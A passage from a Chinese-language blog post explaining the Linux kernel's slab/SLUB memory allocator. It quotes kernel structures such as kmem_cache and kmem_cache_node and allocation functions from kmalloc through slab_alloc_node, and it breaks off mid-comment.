class="keyword">unsigned</span> <span class="keyword">int</span> freelist_size; <span class="comment">/* 空闲对象链表的大小 */</span></span><br><span class="line">	<span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *obj); <span class="comment">/* 创建高速缓存时的构造函数指针,一半为null */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 4) cache creation/removal */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">/* slab缓存名字 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span> <span class="comment">/* slab缓存描述符双向链表指针 */</span></span><br><span class="line">	<span class="keyword">int</span> refcount;</span><br><span class="line">	<span class="keyword">int</span> object_size; <span class="comment">/* slab中每个obj的大小 */</span></span><br><span class="line">	<span class="keyword">int</span> align; <span class="comment">/* obj对齐字节 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 5) statistics */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_SLAB</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> num_active;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> num_allocations;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> high_mark;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> grown;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> reaped;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> errors;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> max_freeable;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> node_allocs;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> node_frees;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> node_overflow;</span><br><span class="line">	<span class="keyword">atomic_t</span> allochit;</span><br><span class="line">	<span class="keyword">atomic_t</span> allocmiss;</span><br><span class="line">	<span class="keyword">atomic_t</span> freehit;</span><br><span class="line">	<span class="keyword">atomic_t</span> freemiss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_SLAB_LEAK</span></span><br><span class="line">	<span class="keyword">atomic_t</span> store_user_clean;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span> obj_offset;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_DEBUG_SLAB */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span> <span class="comment">/* slab节点链表组,对于NUMA系统中每个节点都会有一个struct kmem_cache_node数据结构 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>slab cache 中所有 slab 的大小一致，由一个或多个连续页组成（通常为一个page，伙伴系统提供）</li>
<li>每个 slab 中的 obj 大小和数量也是相同的</li>
</ul>
<p>slab cache 描述符 struct kmem_cache 中除了相关的管理数据外，有两个很重要的成员： </p>
<ul>
<li>struct array_cache __percpu *cpu_cache：<ul>
<li>cpu_cache 是一个 Per-CPU 数据结构，每个 CPU 独享（相当于函数和它局部变量的关系），用来表示本地 CPU 的 slab cache 对象缓冲池（注意是 slab cache obj 缓冲池不是 slab cache slab 缓冲池）</li>
<li>CPU 都有自己的硬件高速缓存，当前 CPU 上释放对象时，这个对象很可能还在 CPU 的硬件高速缓存中，这时使用这个对象的代价是非常小的，不需要重新装载到硬件高速缓存中，离 CPU 又最近，同时还可以减少锁的竞争，尤其是在多个 CPU 同时申请同样 size 或者同个缓存对象时，无需加锁即可操作</li>
<li>array_cache中 的 entry 空数组，就是用于保存本地 cpu 刚释放的 obj，所以该数组初始化时为空，只有本地 cpu 释放 slab cache 的 obj 后才会将此 obj 装入到 entry 数组 array_cache 的 entry 成员数组中保存的 obj 数量是由成员 limit 控制的，超过该限制后会将 entry 数组中的 batchcount 个 obj 迁移到对应节点 cpu 共享的空闲对象链表中</li>
<li>entry 数组的访问机制是 LIFO（last in fist out），此种设计非常巧妙，能保证本地 cpu 最近释放该 slab cache 的 obj 立马被下一个 slab 内存申请者获取到（有很大概率此 obj 仍然在本地 cpu 的硬件高速缓存中）</li>
</ul>
</li>
<li>struct kmem_cache_node *node[MAX_NUMNODES]：<ul>
<li>slab 缓存会为不同的节点维护一个自己的 slab 链表，用来缓存和管理自己节点的 slab obj，这通过 kmem_cache 中 node 数组成员来实现，node 数组中的每个数组项都为其对应的节点分配了一个 struct kmem_cache_node 结构</li>
<li>struct kmem_cache_node 结构定义的变量是一个每 node 变量，相比于 struct array_cache 定义的每 cpu 变量，kmem_cache_node 管理的内存区域粒度更大，因为kmem_cache_node 维护的对象是 slab，而 array_cache 维护的对象是 slab 中的 obj（一个 kmem_cache 可能包含一个或多个 slab，而一个 slab 中可能包含一个或多个 slab obj）</li>
<li>通过下面 struct kmem_cache_node 结构的代码实现我们来分析该结构体如何实现对本地节点指定 slab cache 中所有的 slab 进行管理的</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_partial</span>;</span>	<span class="comment">/* 该链表中存储的所有slab中只有部分obj是空闲的 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_full</span>;</span> <span class="comment">/* 该链表中存储的所有slab中不存在空闲的obj */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_free</span>;</span> <span class="comment">/* 该链表中存储的所有slab中每个obj都是空闲的 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> total_slabs; <span class="comment">/* 该节点中此kmem_cache的slab总数 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> free_slabs; <span class="comment">/* 该节点中此kmem_cache空闲slab总数 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> free_objects; <span class="comment">/* 该节点中此kmem_cache空闲obj总数 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> free_limit; <span class="comment">/* 该节点中此kmem_cache中空闲obj数量的上限,多了就会回收到伙伴系统的空闲链表中 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> colour_next; <span class="comment">/* Per-node cache coloring */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">shared</span>;</span>	<span class="comment">/* 该节点上所有cpu共享的本地高速缓存 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">alien_cache</span> **<span class="title">alien</span>;</span>	<span class="comment">/* 其他节点上所有cpu共享的本地高速缓存 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> next_reap; <span class="comment">/* updated without locking */</span></span><br><span class="line">	<span class="keyword">int</span> free_touched; <span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> nr_partial;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span> nr_slabs;</span><br><span class="line">	<span class="keyword">atomic_long_t</span> total_objects;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>由上代码可以看出，struct kmem_cache_node 对于本节点中 slab 的管理主要分了3个链表:<ul>
<li>部分空闲 slab 链表（slabs_partial）</li>
<li>全空闲 slab 链表（slabs_free）</li>
<li>非空闲 slab 链表（slabs_full）</li>
</ul>
</li>
<li>单个 slab 可以在不同的链表之间移动，例如当一个 slab 被分配完，就会从 slab_partial 移动到 slabs_full，当一个 slab 中有对象被释放后，就会从 slab_full 再次回到 slab_partial，所有对象都被释放完的话，就会从 slab_partial 移动到 slabs_free</li>
<li>struct kmem_cache_node 还会将本地节点中需要节点共享的 slab obj 缓存在它的 shared 成员中，若本地节点向访问其他节点贡献的 slab obj，可以利用 struct kmem_cache_node 中的 alien 成员去获取</li>
</ul>
<p><strong>slab机制</strong></p>
<p>slab 算法在伙伴算法的基础上，对小内存的场景专门做了优化，采用了内存池的方案，解决内部碎片问题</p>
<p>先挂一张图片： </p>
<img src="/2022/05/23/BuddySystem&Slab/1653927280497-1655875583493.png" class width="1653927280497"> 
<p><strong>从 buddy 分配出来的那一份份连续的 page 就是一个 slab</strong></p>
<ul>
<li>首先我们要知道是 slab 分配器是基于 buddy 分配器的，即 slab 需要从 buddy 分配器获取连续的物理页帧作为制造对象的原材料</li>
<li>简单来说，就是基于 buddy 分配器获得连续的 pages，作为某数据结构对象的缓存，再将这段连续的 pages 从内部切割成一个个对齐的对象，使用时从中取用，这样一段连续的 page 我们称为一个 slab</li>
</ul>
<p><strong>把各个 slab 分组管理，每一个组对应一个 kmem_cache，对应一种分配“规则”</strong></p>
<ul>
<li>在 slab 算法中维护着大小不同的 slab 集合，在最顶层是 cache_chain，cache_chain 中维护着一组 kmem_cache 引用</li>
<li>kmem_cache 负责管理一块固定大小的对象池，通常会提前分配一块内存，然后将这块内存划分为大小相同的 object（分配给用户的对象），不会对内存块再进行合并，同时使用位图 bitmap 记录每个 object 的使用情况</li>
<li>把各个 slab 进行分组管理，每个组分别包含 2^3，2^4，2^5 … 2^11 … 个字节（在 4K 页大小的默认情况下），另外还有两个特殊的组，分别是 96B 和 192B，每个组就是一个 kmem_cache</li>
<li>不同内核版本的分组数不同（大约20个），比如我的内核就分配了26个组：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">kmalloc_index</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!size)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)</span><br><span class="line">		<span class="keyword">return</span> KMALLOC_SHIFT_LOW;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">32</span> &amp;&amp; size &gt; <span class="number">64</span> &amp;&amp; size &lt;= <span class="number">96</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">64</span> &amp;&amp; size &gt; <span class="number">128</span> &amp;&amp; size &lt;= <span class="number">192</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=          <span class="number">8</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=         <span class="number">16</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=         <span class="number">32</span>) <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=         <span class="number">64</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=        <span class="number">128</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=        <span class="number">256</span>) <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=        <span class="number">512</span>) <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=       <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=   <span class="number">2</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=   <span class="number">4</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=   <span class="number">8</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">13</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">14</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">128</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">17</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">256</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">18</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">512</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">21</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">4</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">22</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">8</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">23</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">24</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">25</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">26</span>;</span><br><span class="line">	BUG();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>slab 分配器并非一开始就能智能的根据内存分档值分配相应长度的内存的，它需要先创建一个这样的“规则”式的东西，之后才可以根据这个“规则”分配相应长度的内存 </li>
<li>内核 slab 分配器之所以能够默认的提供26种内存长度分档，肯定也需要创建这样26个“规则”，这是由函数 kmem_cache_init 在初始化时创建的</li>
<li>比如现在有一个内核模块想要申请一种它自创的结构，这个结构是111字节，并且它不想获取128字节内存就想获取111字节长度内存，那么它需要在 slab 分配器中创建一个这样的“规则”，这个规则规定 slab 分配器当按这种“规则”分配时要给我111字节的内存，这个“规则”的创建方法就是调用函数 kmem_cache_create</li>
<li>函数 kmem_cache_destroy 可以销毁 kmem_cache_create 创建的“规则”，而这个“规则”就是“缓存描述符 kmem_cache”</li>
</ul>
<p><strong>slub接口</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 分配一块给某个数据结构使用的kmem_cache(缓存描述符) */</span></span><br><span class="line"><span class="function">struct kmem_cache *<span class="title">kmem_cache_create</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> align, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags， <span class="keyword">void</span> (*ctor)(<span class="keyword">void</span>*))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 销毁kmem_cache_create分配的kmem_cache */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kmem_cache_destroy</span><span class="params">(struct kmem_cache *cachep)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 从目标kmem_cache中分配一个object */</span>  </span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">kmem_cache_alloc</span><span class="params">(struct kmem_cache* cachep, <span class="keyword">gfp_t</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 释放object,把它返还给原先的kmem_cache */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kmem_cache_free</span><span class="params">(struct kmem_cache* cachep,  <span class="keyword">void</span>* objp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 输入想要的size,分配一个object,其他工作交给伙伴系统和slub */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 输入目标obj,释放它,其他工作交给伙伴系统和slub */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *objp)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>先通过 kmem_cache_create 创建一个缓存管理描述符 kmem_cache</li>
<li>使用 kmem_cache_alloc 从缓存 kmem_cache 中申请 object 使用</li>
<li>函数 kmem_cache_init 在初始化时会自动创建默认的 kmem_cache </li>
</ul>
<h2 id="kmalloc"><a href="#kmalloc" class="headerlink" title="kmalloc"></a>kmalloc</h2><p>kmalloc 本质上是调用 __kmalloc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1\mm\slub.c */</span></span><br><span class="line"><span class="keyword">void</span> *__kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line">		<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">	s = kmalloc_slab(size, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">	ret = slab_alloc(s, flags, _RET_IP_); <span class="comment">/* 从对应的kmem_cache中分配对象 */</span></span><br><span class="line"></span><br><span class="line">	trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, flags);</span><br><span class="line"></span><br><span class="line">	kasan_kmalloc(s, ret, size, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__kmalloc);</span><br></pre></td></tr></table></figure>
<ul>
<li>kmalloc() 先根据 size 找到对应的 <code>struct kmem_cache</code> 然后调用 <code>slab_alloc()</code> 从中分配对象</li>
</ul>
<p>slab_alloc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1\mm\slub.c */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>然后在 <code>slab_alloc()</code> 中调用 <code>slab_alloc_node</code></li>
</ul>
<p>slab_alloc_node：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc_node</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *object;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line"></span><br><span class="line">	s = slab_pre_alloc_hook(s, gfpflags);</span><br><span class="line">	<span class="keyword">if</span> (!s)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">redo:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        必须通过本cpu指针去读kmem_cache中的cpu相关数据, </span></span><br><span class="line"><span class="comment">        当读一个CPU区域内的数据时有可能在cpu直接来回切换</span></span><br><span class="line"><span class="comment">        只要我们在执行cmpxchg时再次使用原始 cpu，这并不重要</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        必须保证tid和kmem_cache都是通过同一个CPU获取的</span></span><br><span class="line"><span class="comment">        如果开启了CONFIG_PREEMPT(内核抢占), 那么有可能获取tid之后被换出, 导致tid与c不对应, 所以这里需要一个检查</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		tid = this_cpu_read(s-&gt;cpu_slab-&gt;tid);</span><br><span class="line">		c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">	&#125; <span class="keyword">while</span> (IS_ENABLED(CONFIG_PREEMPT) &amp;&amp;</span><br><span class="line">		 unlikely(tid != READ_ONCE(c-&gt;tid)));</span><br><span class="line"></span><br><span class="line">	barrier(); <span class="comment">// 编译屏障, 防止指令乱序</span></span><br><span class="line"></span><br><span class="line">	object = c-&gt;freelist; <span class="comment">// 获取空闲链表中的对象</span></span><br><span class="line">	page = c-&gt;page; <span class="comment">// 正在被用来分配对象的页</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!object || !node_match(page, node))) &#123;</span><br><span class="line">        <span class="comment">/* 如果空闲链表为空或者page不属于要求的节点,那么就进入slowpath部分 */</span></span><br><span class="line">		object = __slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">		stat(s, ALLOC_SLOWPATH);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 否则进入fastpath,通过CPU缓存中的freelist进行分配 */</span></span><br><span class="line">		<span class="keyword">void</span> *next_object = get_freepointer_safe(s, object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*这里要执行链表的取出操作, this_cpu_cmpxchg_double()作用为:</span></span><br><span class="line"><span class="comment">        如果s-&gt;cpu_slab-&gt;freelist==object, 那么s-&gt;cpu_slab-&gt;freelist=next_object</span></span><br><span class="line"><span class="comment">        如果s-&gt;cpu_slab-&gt;tid==tid, 那么s-&gt;cpu_slab-&gt;tid=next_tid(tid), next_tid(tid)</span></span><br><span 